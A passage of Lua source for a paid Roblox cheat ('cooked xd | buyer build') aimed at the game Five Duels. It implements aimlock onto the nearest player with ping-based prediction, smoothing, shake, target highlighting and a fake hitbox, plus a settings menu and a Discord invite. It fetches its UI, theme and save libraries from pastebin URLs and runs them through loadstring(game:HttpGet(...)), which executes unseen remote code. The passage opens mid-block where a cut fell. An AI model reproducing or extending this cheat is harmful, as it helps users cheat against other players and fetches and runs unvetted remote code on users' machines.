            if getgenv().NotiMode == ""Akali"" then
                ANotify({
                    Description = NotiINFO;
                    Title = ""cooked"";
                    Duration = 1;
                    });
                else
                    Kick('[cooked]: Notification Error, please contact support if this continues.')
        end
            end
                end
            end
    
    
    if game.PlaceId == 11883610532 or game.PlaceId == 12128125888 or game.PlaceId == 12543953865 then 
        print(""[cooked]: Five Duels Detected"")
        getgenv().fdDetected = true
    
    getgenv().AimPart = ""HumanoidRootPart"" 
    getgenv().OldAimPart = ""HumanoidRootPart""
    getgenv().AimlockKey = ""q""
    getgenv().AimRadius = 5
    getgenv().ThirdPerson = true 
    getgenv().FirstPerson = true
    getgenv().TeamCheck = false 
    getgenv().PredictMovement = false
    getgenv().PredictionVelocity = 7.22
    
    getgenv().Smoothness = false
    getgenv().SmoothnessAmount = 1
    getgenv().EasingStyle = Enum.EasingStyle.Elastic
    
    getgenv().Notifications = false
    
    getgenv().AutoPrediction = false
    getgenv().UnlockOnDeath = false
    getgenv().Shake = false
    getgenv().ShakePower = 0
    
    local Players, Uis, RService, SGui = game:GetService""Players"", game:GetService""UserInputService"", game:GetService""RunService"", game:GetService""StarterGui"";
    local Client, Mouse, Camera, CF, RNew, Vec3, Vec2 = Players.LocalPlayer, Players.LocalPlayer:GetMouse(), workspace.CurrentCamera, CFrame.new, Ray.new, Vector3.new, Vector2.new;
    local Aimlock, MousePressed, CanNotify = true, false, false;
    local AimlockTarget
    local OldPre;
    
    
    
    getgenv().WorldToViewportPoint = function(P)
        return Camera:WorldToViewportPoint(P)
    end
    
    getgenv().WorldToScreenPoint = function(P) 
        return Camera.WorldToScreenPoint(Camera, P)
    end
    
    getgenv().GetObscuringObjects = function(T)
        if T and T:FindFirstChild(getgenv().AimPart) and Client and Client.Character:FindFirstChild(""Head"") then 
            local RayPos = workspace:FindPartOnRay(RNew(
                T[getgenv().AimPart].Position, Client.Character.Head.Position)
            )
            if RayPos then return RayPos:IsDescendantOf(T) end
        end
    end
    
    getgenv().GetNearestTarget = function()
        local players = {}
        local PLAYER_HOLD  = {}
        local DISTANCES = {}
        for i, v in pairs(Players:GetPlayers()) do
            if v ~= Client then
                table.insert(players, v)
            end
        end
        for i, v in pairs(players) do
            if v.Character ~= nil then
                local AIM = v.Character:FindFirstChild(""Head"")
                if getgenv().TeamCheck == true and v.Team ~= Client.Team then
                    local DISTANCE = (v.Character:FindFirstChild(""Head"").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                    local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                    local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                    local DIFF = math.floor((POS - AIM.Position).magnitude)
                    PLAYER_HOLD[v.Name .. i] = {}
                    PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                    PLAYER_HOLD[v.Name .. i].plr = v
                    PLAYER_HOLD[v.Name .. i].diff = DIFF
                    table.insert(DISTANCES, DIFF)
                elseif getgenv().TeamCheck == false and v.Team == Client.Team then 
                    local DISTANCE = (v.Character:FindFirstChild(""Head"").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                    local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                    local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                    local DIFF = math.floor((POS - AIM.Position).magnitude)
                    PLAYER_HOLD[v.Name .. i] = {}
                    PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                    PLAYER_HOLD[v.Name .. i].plr = v
                    PLAYER_HOLD[v.Name .. i].diff = DIFF
                    table.insert(DISTANCES, DIFF)
                end
            end
        end
        
        if unpack(DISTANCES) == nil then
            return nil
        end
        
        local L_DISTANCE = math.floor(math.min(unpack(DISTANCES)))
        if L_DISTANCE > getgenv().AimRadius then
            return nil
        end
        
        for i, v in pairs(PLAYER_HOLD) do
            if v.diff == L_DISTANCE then
                return v.plr
            end
        end
        return nil
    end
    
    
    
    RService.RenderStepped:Connect(function()
        if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then 
            if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 or (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
                CanNotify = true 
            else 
                CanNotify = false 
            end
        elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then 
            if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 then 
                CanNotify = true 
            else 
                CanNotify = false 
            end
        elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then 
            if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
                CanNotify = true 
            else 
                CanNotify = false 
            end
        end
        if Aimlock == true and MousePressed == true then 
            if AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(getgenv().AimPart) then 
                if getgenv().FirstPerson == true then
                    if CanNotify == true then
                        if getgenv().PredictMovement == true then
                            if getgenv().Smoothness == true then
                                --// The part we're going to lerp/smoothen \\--
                                local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                                
                                --// Making it work \\--
                                Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, getgenv().EasingStyle , Enum.EasingDirection.InOut)
                            else
                                Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                            end
                        elseif getgenv().PredictMovement == false then 
                            if getgenv().Smoothness == true then
                                --// The part we're going to lerp/smoothen \\--
                                local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
    
                                --// Making it work \\--
                                Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, getgenv().EasingStyle , Enum.EasingDirection.InOut)
                            else
                                Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
                            end
                        end
                    end
                end
            end
        end
       if getgenv().UnlockOnDeath  == true and AimlockTarget and AimlockTarget.Character:FindFirstChild(""Humanoid"") then
        if AimlockTarget.StarterPlayer.StarterCharacterScripts.BodyEffects['K.O'] then
            AimlockTarget = nil
            
            if getgenv().Notifications == true then
                Notify({
                    Title = BlazedName,
                    Description = ""Unlocked"",
                    Duration = 1
                })
            end
            if getgenv().ChatNotis == true then
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""Unlocked"",""All"")
            end
        end
    end
    
                if getgenv().Shake == true and AimlockTarget and AimlockTarget.Character then
                    local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity +
                    Vector3.new(
                        math.random(-getgenv().ShakePower, getgenv().ShakePower),
                        math.random(-getgenv().ShakePower, getgenv().ShakePower),
                        math.random(-getgenv().ShakePower, getgenv().ShakePower)
                    ) * 0.1)
                    Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, getgenv().EasingStyle , Enum.EasingDirection.InOut)
                end
    
       if getgenv().AutoPrediction == true then
        pingvalue = game:GetService(""Stats"").Network.ServerStatsItem[""Data Ping""]:GetValueString()
        split = string.split(pingvalue,'(')
        ping = tonumber(split[1])
    if ping < 30 then
        getgenv().PredictionVelocity = 7.758
    elseif ping < 40 then
        getgenv().PredictionVelocity = 7.364
    elseif ping < 50 then
        getgenv().PredictionVelocity = 7.456 
    elseif ping < 60 then
        getgenv().PredictionVelocity = 7.217
    elseif ping < 70 then
        getgenv().PredictionVelocity = 6.972 
    elseif ping < 80 then
        getgenv().PredictionVelocity = 6.782
    elseif ping < 90 then
        getgenv().PredictionVelocity = 6.597 
    elseif ping < 100 then
        getgenv().PredictionVelocity = 3.88
    elseif ping < 110 then
        getgenv().PredictionVelocity = 6.099
    end
    end
    
    end)
    
    
    
    local repo = 'https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/'
    local Library = loadstring(game:HttpGet('https://pastebin.com/raw/7Tk5QM6R'))()
    local ThemeManager = loadstring(game:HttpGet('https://pastebin.com/raw/WxMCy9be'))()
    local SaveManager = loadstring(game:HttpGet('https://pastebin.com/raw/rNY1ZdQT'))()
    
    local Window = Library:CreateWindow({
        Title = 'cooked xd | buyer build | five duels',
        Center = true, 
        AutoShow = true,
        Size = UDim2.fromOffset(550, 560),
        TabPadding = 4,
    })
    
    
    
    local Tabs = {
        Main = Window:AddTab('Aiming'),
        ['Settings'] = Window:AddTab('Settings'),
    }
    
    local LeftGroupBox = Tabs.Main:AddLeftGroupbox('Aimlock')
    
    
    
    LeftGroupBox:AddToggle('Aimlock', {
        Text = 'Enable',
        Default = false, 
        Tooltip = 'Enables Aimlock', 
    })
    
    Toggles.Aimlock:OnChanged(function()
        getgenv().AimlockEnabled = Toggles.Aimlock.Value
    end)
    
    
    Toggles.Aimlock:AddKeyPicker('AimlockBind', {
        Default = 'None', 
        SyncToggleState = false, 
    
        Mode = 'Toggle',
    
        Text = 'Enable', 
        NoUI = false,
    })
    Options.AimlockBind:OnClick(function()
    if AimlockEnabled then 
        Target = not Target
        --
        if AimlockTarget then
            AimlockTarget = nil
            MousePressed = false
            if getgenv().Notifications then
                Notifications(""Unlocked"")
            end
        else
            if AimlockTarget == nil then
                local Target;Target = GetNearestTarget()
                if Target ~= nil then 
                    AimlockTarget = Target
                    if getgenv().Notifications then
                        notifications:BuildNotificationUI();
                        Notifications(""Locked Onto""..tostring(Aimlock));
                    end
                    MousePressed = true
                end
            end
        end
            end
    end)
    
    LeftGroupBox:AddInput('CamPrediction', {
        Default = '7.22',
        Numeric = true, 
        Finished = false,
        Text = 'Prediction',
        Tooltip = 'Example: 7.22', 
        Placeholder = '...', 
        Callback = function(int)
            getgenv().PredictionVelocity = int
            notifications:BuildNotificationUI();
            Notifications(""Prediction Changed To: ""..tostring(int));
            end 
    })
    
    LeftGroupBox:AddToggle('CamPingBased', {
        Text = 'Ping Based',
        Default = false, 
        Tooltip = 'Autos Configures Prediction', 
    })
    
    Toggles.CamPingBased:OnChanged(function()
        getgenv().AutoPrediction = Toggles.CamPingBased.Value
    end)
    
    LeftGroupBox:AddDropdown('CamHitpart', {
        Values = { 'HumanoidRootPart', 'UpperTorso', 'LowerTorso', 'Head' },
        Default = 1, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Hitpart',
        Tooltip = 'Where your bullets will hit', -- Information shown when you hover over the textbox
    })
    
    Options.CamHitpart:OnChanged(function()
        getgenv().AimPart = Options.CamHitpart.Value
    end)
    
    LeftGroupBox:AddToggle('CamAlerts', {
        Text = 'Notifications',
        Default = false, 
        Tooltip = 'Notifys Locking/Unlocking', 
    })
    
    Toggles.CamAlerts:OnChanged(function()
        getgenv().Notifications = Toggles.CamAlerts.Value
    end)
    
    
    
    LeftGroupBox:AddToggle('CamUnOnD', {
        Text = 'Unlock On Death',
        Default = false, 
        Tooltip = 'Automatically Unlocks Target On KO', 
    })
    
    Toggles.CamUnOnD:OnChanged(function()
        getgenv().UnlockOnDeath = Toggles.CamUnOnD.Value
    end)
    
    LeftGroupBox:AddToggle('CamShake', {
        Text = 'Shake',
        Default = false, 
        Tooltip = 'Shakes On The Target', 
    })
    
    Toggles.CamShake:OnChanged(function()
        getgenv().Shake = Toggles.CamShake.Value
    end)
    
    
    LeftGroupBox:AddInput('CamShakePower', {
        Default = '5',
        Numeric = true, 
        Finished = false,
        Text = 'Shake Power',
        Tooltip = 'Ex: 5', 
        Placeholder = '...', 
        Callback = function(int)
            getgenv().ShakePower = int
            notifications:BuildNotificationUI();
            Notifications(""Shake Power Changed To: ""..tostring(int));
            end 
    })
    
    LeftGroupBox:AddToggle('CamSmoothness', {
        Text = 'Smoothness',
        Default = false, 
        Tooltip = 'Smoothens Camlock', 
    })
    
    Toggles.CamSmoothness:OnChanged(function()
        getgenv().Smoothness = Toggles.CamSmoothness.Value
    end)
    
    LeftGroupBox:AddInput('CamSmoothnessPWR', {
        Default = '1',
        Numeric = true, 
        Finished = false,
        Text = 'Smoothness Power',
        Tooltip = 'Ex: 0.52', 
        Placeholder = '...', 
        Callback = function(int)
            getgenv().SmoothnessAmount = int
            notifications:BuildNotificationUI();
            Notifications(""Smoothness Power Changed To: ""..tostring(int));
            end, 0.01
    })
    
    LeftGroupBox:AddDropdown('CamSmoothingStyle', {
        Values = { 'Linear', 'Sine', 'Back', 'Quad', 'Quart', 'Quint', 'Bounce', 'Elastic', 'Exponential', 'Circular', 'Cubic' },
        Default = 1, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Smoothing Style',
        Tooltip = 'Aimlock Smoothing Style', -- Information shown when you hover over the textbox
    })
    
    Options.CamSmoothingStyle:OnChanged(function()
        if Options.CamSmoothingStyle.Value == ""Linear"" then
            getgenv().EasingStyle = Enum.EasingStyle.Linear
        end
    
        if Options.CamSmoothingStyle.Value == ""Sine"" then
            getgenv().EasingStyle = Enum.EasingStyle.Sine
        end
    
        if Options.CamSmoothingStyle.Value == ""Back"" then
            getgenv().EasingStyle = Enum.EasingStyle.Back
        end
    
        if Options.CamSmoothingStyle.Value == ""Quad"" then
            getgenv().EasingStyle = Enum.EasingStyle.Quad
        end
    
        if Options.CamSmoothingStyle.Value == ""Quart"" then
            getgenv().EasingStyle = Enum.EasingStyle.Quart
        end
    
        if Options.CamSmoothingStyle.Value == ""Quint"" then
            getgenv().EasingStyle = Enum.EasingStyle.Quint
        end
    
        if Options.CamSmoothingStyle.Value == ""Bounce"" then
            getgenv().EasingStyle = Enum.EasingStyle.Bounce
        end
    
        if Options.CamSmoothingStyle.Value == ""Elastic"" then
            getgenv().EasingStyle = Enum.EasingStyle.Elastic
        end
    
        if Options.CamSmoothingStyle.Value == ""Exponential"" then
            getgenv().EasingStyle = Enum.EasingStyle.Exponential
        end
    
        if Options.CamSmoothingStyle.Value == ""Circular"" then
            getgenv().EasingStyle = Enum.EasingStyle.Circular
        end
    
        if Options.CamSmoothingStyle.Value == ""Cubic"" then
            getgenv().EasingStyle = Enum.EasingStyle.Cubic
        end
    end)
    
    
        
    --[[local MyButton2 = MyButton:AddButton('Sub button', function()
        print('You clicked a sub button!')
    end)
    
    
    MyButton:AddTooltip('This is a button')
    MyButton2:AddTooltip('This is a sub button')
    
    LeftGroupBox:AddLabel('This is a label')
    LeftGroupBox:AddLabel('This is a label\n\nwhich wraps its text!', true)
    
    LeftGroupBox:AddDivider()
    
    LeftGroupBox:AddSlider('MySlider', {
        Text = 'This is my slider!',
        Default = 0,
        Min = 0,
        Max = 5,
        Rounding = 1,
        Compact = false, 
    })
    
    local Number = Options.MySlider.Value
    Options.MySlider:OnChanged(function()
        print('MySlider was changed! New value:', Options.MySlider.Value)
    end)
    
    Options.MySlider:SetValue(3)
    
    
    LeftGroupBox:AddInput('MyTextbox', {
        Default = 'My textbox!',
        Numeric = false, 
        Finished = false,
    
        Text = 'This is a textbox',
        Tooltip = 'This is a tooltip', 
    
        Placeholder = 'Placeholder text',
    })
    
    Options.MyTextbox:OnChanged(function()
        print('Text updated. New text:', Options.MyTextbox.Value)
    end)
    
    LeftGroupBox:AddDropdown('MyDropdown', {
        Values = { 'This', 'is', 'a', 'dropdown' },
        Default = 1, 
        Multi = false,
    
        Text = 'A dropdown',
        Tooltip = 'This is a tooltip',
    })
    
    Options.MyDropdown:OnChanged(function()
        print('Dropdown got changed. New value:', Options.MyDropdown.Value)
    end)
    
    Options.MyDropdown:SetValue('This')
    
    LeftGroupBox:AddDropdown('MyMultiDropdown', {
        Values = { 'This', 'is', 'a', 'dropdown' },
        Default = 1, 
        Multi = true,
    
        Text = 'A dropdown',
        Tooltip = 'This is a tooltip',
    })
    
    Options.MyMultiDropdown:OnChanged(function()
        -- print('Dropdown got changed. New value:', )
        print('Multi dropdown got changed:')
        for key, value in next, Options.MyMultiDropdown.Value do
            print(key, value) -- should print something like This, true
        end
    end)
    
    Options.MyMultiDropdown:SetValue({
        This = true,
        is = true,
    })
    
    LeftGroupBox:AddLabel('Color'):AddColorPicker('ColorPicker', {
        Default = Color3.new(0, 1, 0),
        Title = 'Some color', 
    })
    
    Options.ColorPicker:OnChanged(function()
        print('Color changed!', Options.ColorPicker.Value)
    end)
    
    Options.ColorPicker:SetValueRGB(Color3.fromRGB(0, 255, 140))
    
    LeftGroupBox:AddLabel('Keybind'):AddKeyPicker('KeyPicker', {
        Default = 'MB2',
        SyncToggleState = false, 
        Mode = 'Toggle', 
        Text = 'Auto lockpick safes', 
        NoUI = false, 
    })]]
    
    
    -- Example of dynamically-updating watermark with common traits (fps and ping)
    local FrameTimer = tick()
    local FrameCounter = 0;
    local FPS = 240;
    
    local WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
        FrameCounter += 1;
    
        if (tick() - FrameTimer) >= 1 then
            FPS = FrameCounter;
            FrameTimer = tick();
            FrameCounter = 0;
        end;
        Library:SetWatermark(('cooked xd | %s fps | %s ms'):format(
            math.floor(FPS),
            math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
        ));
    
    
    
    
    
    Library:OnUnload(function()
        Library.Unloaded = true
    end);
    end)
    
    local MenuGroup = Tabs['Settings']:AddRightGroupbox('Menu')
    --AddLeftGroupbox
    
    
    
    MenuGroup:AddLabel('Menu Keybind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' }) 
    
    MenuGroup:AddToggle('KeybindList', {
        Text = 'Keybind List',
        Default = false, 
        Tooltip = 'Toggles the Keybind List', 
    })
    
    Toggles.KeybindList:OnChanged(function()
        Library.KeybindFrame.Visible  = Toggles.KeybindList.Value
    end)
    
    MenuGroup:AddToggle('Watermark', {
        Text = 'Watermark',
        Default = false, 
        Tooltip = 'Toggles the Watermark', 
    })
    
    Toggles.Watermark:OnChanged(function()
        Library:SetWatermarkVisibility(Toggles.Watermark.Value) 
    end)
    
    
    
    MenuGroup:AddDropdown('UINotis', {
        Values = { 'Xaxa', 'Roblox', 'Akali' },
        Default = 2, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Notification Type',
        Tooltip = 'Change What Notifications Show Up', -- Information shown when you hover over the textbox
    })
    
    Options.UINotis:OnChanged(function()
        getgenv().NotiMode = Options.UINotis.Value
    end)
    
    
    --
    local Unload1 = MenuGroup:AddButton({
        Text = 'Unload',
        Func = function()
            Library:Unload()
        end,
        DoubleClick = true,
        Tooltip = 'Unloads The Cheat'
    })
    
    local Unload2 = Unload1:AddButton({
        Text = 'Join Discord',
        Func = function()
            setclipboard(""discord.gg/lockers"")
            notifications:BuildNotificationUI();
            Notifications(""discord.gg/lockers"");
            local request = (syn and syn.request) or (http and http.request) or http_request
            local HttpService = game:GetService(""HttpService"")
            if request then
                request({
                    Url = 'http://127.0.0.1:6463/rpc?v=1',
                    Method = 'POST',
                    Headers = {
                        ['Content-Type'] = 'application/json',
                        Origin = 'https://discord.com'
                    },
                    Body = HttpService:JSONEncode({
                        cmd = 'INVITE_BROWSER',
                        nonce = HttpService:GenerateGUID(false),
                        args = {code = ""lockers""}
                    })
                })
            end
        end,
        DoubleClick = false, -- You will have to click this button twice to trigger the callback
        Tooltip = 'Joins Our Discord'
    })
    
    Library.ToggleKeybind = Options.MenuKeybind
    
    ThemeManager:SetLibrary(Library)
    SaveManager:SetLibrary(Library)
    
    --SaveManager:IgnoreThemeSettings() 
    
    --SaveManager:SetIgnoreIndexes({ 'MenuKeybind' }) 
    
    ThemeManager:SetFolder('cooked-thm')
    SaveManager:SetFolder('cookedxd-fd-cfg')
    
    SaveManager:BuildConfigSection(Tabs['Settings']) 
    
    ThemeManager:ApplyToTab(Tabs['Settings'])
    
    Notifications(""Loaded In ""..string.format(""%.2f"", tostring(tick() - loadingtime,nil))..tostring("" Seconds""))
    loadingtime = nil
    
    else
    
    
    Notifications(""Cooked is loading!"");
    
    local InputService, TeleportService, RunService, Workspace, Lighting, Players, HttpService, StarterGui, ReplicatedStorage, TweenService, VirtualUser, PathFindingService, Stats = game:GetService(""UserInputService""), game:GetService(""TeleportService""), game:GetService(""RunService""), game:GetService(""Workspace""), game:GetService(""Lighting""), game:GetService(""Players""), game:GetService(""HttpService""), game:GetService(""StarterGui""), game:GetService(""ReplicatedStorage""), game:GetService(""TweenService""), game:GetService(""VirtualUser""), game:GetService(""PathfindingService""), game:GetService(""Stats"")
    local NewVector2, NewVector3, NewCFrame, NewAngle = Vector2.new, Vector3.new, CFrame.new, CFrame.Angles
    local NewRGB, NewHex = Color3.fromRGB, Color3.fromHex
    local Find, Clear, Sub, Upper, Lower, Insert = table.find, table.clear, string.sub, string.upper, string.lower, table.insert
    local Mouse, Camera, LocalPlayer = Players.LocalPlayer:GetMouse(), Workspace.Camera, Players.LocalPlayer
    local Huge, Pi, Clamp, Round, Abs, Floor, Random, Sin, Cos, Rad, Halfpi = math.huge, math.pi, math.clamp, math.round, math.abs, math.floor, math.random, math.sin, math.cos, math.rad, math.pi/2
        
    getgenv().Lock = {
        Enabled = false, 
        Mode = """", 
        Locking = false, 
        Resolver = false, 
        LookAt = false, 
        ViewAt = false, 
        Target = {Player = nil, Part = nil, Position = nil, Angle = 0}, 
        ClosetPoint = false,
        AntiAimViewer = false,
        AntiCurve = false,
        UnlockOnDeath = false,
        ChatAlerts = false,
        Visualize = {
            Tracer = {false, nil}, 
            Highlight = nil,
            Dot = false, 
            Hitbox = false,
            Strafe = false,
            Notify = false,
            X = 5,
            Y = 8,
            Z = 5,
            TargetUI = nil,
        },
        Target_Strafe = {false, 0, 0, 0},
        Prediction = {
            Part = nil, -- Closest bodypart [Make it just {""HumanoidRootPart""} for just hrp]
            Air = false,
            Amount = 0.13,
            PingBased = false, 
        }, 
        Drawings = {} 
    }
    getgenv().offset = 0.06
    local offset = getgenv().offset
    -- Functions and Renders :3
    function Lock:GetPlayerStatus(Player)
        if not Player then Player = LocalPlayer end
        return Player.Character and Player.Character:FindFirstChild(""Humanoid"") and Player.Character.Humanoid.Health > 0 and true or false
    end
    -- 
    function Lock:GetClosestPlayer()
        local shortestDistance = math.huge
        --  
        local closestPlayer
        for _, Player in pairs(Players:GetPlayers()) do
            if Player ~= LocalPlayer and Lock:GetPlayerStatus(Player) then
                local pos, OnScreen = Camera:WorldToViewportPoint(Player.Character.HumanoidRootPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y + 36)).magnitude
                --
                if magnitude < shortestDistance and OnScreen then
                        closestPlayer = Player
                        shortestDistance = magnitude
                    end
                end
            end 
        return closestPlayer
    end
    -- 
    function Lock:newDrawing(type, prop)
        local obj = Drawing.new(type)
        --
        if prop then
            for i,v in next, prop do
                obj[i] = v
            end
        end
        return obj  
    end
        -- 
        function Lock:newDrawing(type, prop)
            local obj = Drawing.new(type)
            --
            if prop then
                for i,v in next, prop do
                    obj[i] = v
                end
            end
            return obj  
        end
        -- 
        function Lock:CalculateAbsolutePosition(Player)
            if Lock:GetPlayerStatus(Player) then
                local root = Player.Character[""HumanoidRootPart""]
                --
                local currentPosition = root.Position
                local currentTime = tick() 
                --
                Wait()
                --
                local newPosition = root.Position
                local newTime = tick()
                --
                local distanceTraveled = (newPosition - currentPosition) 
                --
                local timeInterval = newTime - currentTime
                local velocity = distanceTraveled / timeInterval
                currentPosition = newPosition
                currentTime = newTime
                --
                return velocity
            end
        end 
        --
        function Lock:GetTool() 
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildWhichIsA(""Tool"") and Lock:GetPlayerStatus() then 
                return LocalPlayer.Character:FindFirstChildWhichIsA(""Tool"") 
            end 
        end 
        --
        function Lock:GetTracerOrigin(Origin) 
            if Origin == ""Head"" then 
                return Camera:WorldToViewportPoint(LocalPlayer.Character.Head.Position) 
            elseif Origin == ""Gun"" then
                local Tool = Lock:GetTool() 
                if Tool and Tool.Handle ~= nil then 
                    return Camera:WorldToViewportPoint(Tool.Handle.Position)
                else 
                    return nil 
                end 
            else 
                return Vector2.new(Mouse.X, Mouse.Y + 36) --[[ Cause its 36 pixels offset for some odd reason??? ]]
            end 
        end 
        -- Drawing and Rendering Everything
        Lock.Drawings.Tracer = Lock:newDrawing(""Line"", {Visible = false, Color = NewRGB(255, 255, 255), Thickness = 1, ZIndex = 2, Transparency = 1})
        Lock.Drawings.Dot = Lock:newDrawing(""Circle"", {Filled = true, Visible = false, Color = NewRGB(255, 255, 255), Thickness = 1, ZIndex = 2, Transparency = 1, Radius = 10})
        Lock.Drawings.FOV = Lock:newDrawing(""Circle"", {Visible = false, Color = NewRGB(255, 255, 255), Thickness = 1, ZIndex = 2, Transparency = 1, Radius = 2})
        -- 
        -- 
        Lock.Drawings.FakeHitbox = Instance.new(""Part"")
        Lock.Drawings.FakeHitbox.Anchored = false 
        Lock.Drawings.FakeHitbox.CanCollide = false 
        Lock.Drawings.FakeHitbox.CFrame = CFrame.new(9999,9999,9999)
        Lock.Drawings.FakeHitbox.Parent = game.Workspace
        Lock.Drawings.FakeHitbox.Material = Enum.Material.Neon
        Lock.Drawings.FakeHitbox.Color = Color3.fromRGB(255,255,255)
        Lock.Drawings.FakeHitbox.Transparency = 0.8
    
    
    
    local highlight = Instance.new(""Highlight"")
    
    
    
    RunService.RenderStepped:Connect(function()
        if Lock.Locking and Lock.Visualize.Highlight then
        highlight.Parent = Lock.Target.Player.Character
        highlight.FillColor = getgenv().fillcolor
        highlight.OutlineColor = getgenv().outlinecolor
        else
            highlight.Parent = game.CoreGui
        end
    end)
    
    
        
    
    local gui = 
    {
        targetui = Instance.new(""ScreenGui""),
        Frame = Instance.new(""Frame""),
        ImageLabel = Instance.new(""ImageLabel""),
        LocalScript = Instance.new(""LocalScript""),
        TextLabel = Instance.new(""TextLabel""),
        LocalScript_1 = Instance.new(""LocalScript""),
        Frame_1 = Instance.new(""Frame""),
        TextLabel_1 = Instance.new(""TextLabel""),
        LocalScript_2 = Instance.new(""LocalScript""),
        Frame_2 = Instance.new(""Frame""),
        TextLabel_2 = Instance.new(""TextLabel""),
        LocalScript_3 = Instance.new(""LocalScript""),
        UIGradient = Instance.new(""UIGradient""),
        Shadow = Instance.new(""ImageLabel""),
        Gradient = Instance.new(""UIGradient""),
    }
    
    
    gui.targetui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.targetui.Name = ""targetui""
    gui.targetui.Parent = game:GetService(""CoreGui"")
    
    gui.Frame.BorderSizePixel = 0
    gui.Frame.Size = UDim2.new(0, 323, 0, 112)
    gui.Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    gui.Frame.Name = ""Frame""
    gui.Frame.Position = UDim2.new(0.414371, 0, 0.854945, 0)
    gui.Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    gui.Frame.Parent = gui.targetui
    
    gui.ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    gui.ImageLabel.Image = ""rbxasset://textures/ui/GuiImagePlaceholder.png""
    gui.ImageLabel.Size = UDim2.new(0, 75, 0, 75)
    gui.ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    gui.ImageLabel.Name = ""ImageLabel""
    gui.ImageLabel.BackgroundTransparency = 1
    gui.ImageLabel.Position = UDim2.new(0.0400908, 0, 0.151078, 0)
    gui.ImageLabel.Parent = gui.Frame
    
    gui.LocalScript.Name = ""LocalScript""
    gui.LocalScript.Parent = gui.ImageLabel
    
    gui.TextLabel.TextStrokeTransparency = 0
    gui.TextLabel.BorderSizePixel = 0
    gui.TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    gui.TextLabel.Font = Enum.Font.Code
    gui.TextLabel.TextSize = 13
    gui.TextLabel.Position = UDim2.new(0.321981, 0, 0.3125, 0)
    gui.TextLabel.Size = UDim2.new(0, 200, 0, 23)
    gui.TextLabel.Name = ""TextLabel""
    gui.TextLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    gui.TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    gui.TextLabel.Text = ""@nil""
    gui.TextLabel.BackgroundTransparency = 1
    gui.TextLabel.TextXAlignment = Enum.TextXAlignment.Left
    gui.TextLabel.Parent = gui.Frame
    
    gui.LocalScript_1.Name = ""LocalScript""
    gui.LocalScript_1.Parent = gui.TextLabel
    
    gui.Frame_1.BorderSizePixel = 0
    gui.Frame_1.Size = UDim2.new(0, 211, 0, 22)
    gui.Frame_1.BorderColor3 = Color3.fromRGB(0, 0, 0)
    gui.Frame_1.Name = ""Frame""
    gui.Frame_1.Position = UDim2.new(0.321981, 0, 0.625, 0)
    gui.Frame_1.BackgroundColor3 = Color3.fromRGB(227, 181, 200)
    gui.Frame_1.Parent = gui.Frame
    
    gui.TextLabel_1.TextStrokeTransparency = 0
    gui.TextLabel_1.BorderSizePixel = 0
    gui.TextLabel_1.BackgroundColor3 = Color3.fromRGB(227, 181, 200)
    gui.TextLabel_1.Font = Enum.Font.Code
    gui.TextLabel_1.TextSize = 14
    gui.TextLabel_1.Position = UDim2.new(0.0584566, 0, 0, 0)
    gui.TextLabel_1.Size = UDim2.new(0, 185, 0, 20)
    gui.TextLabel_1.Name = ""TextLabel""
    gui.TextLabel_1.TextColor3 = Color3.fromRGB(255, 255, 255)
    gui.TextLabel_1.BorderColor3 = Color3.fromRGB(0, 0, 0)
    gui.TextLabel_1.Text = ""Health: nan""
    gui.TextLabel_1.BackgroundTransparency = 1
    gui.TextLabel_1.Parent = gui.Frame_1
    
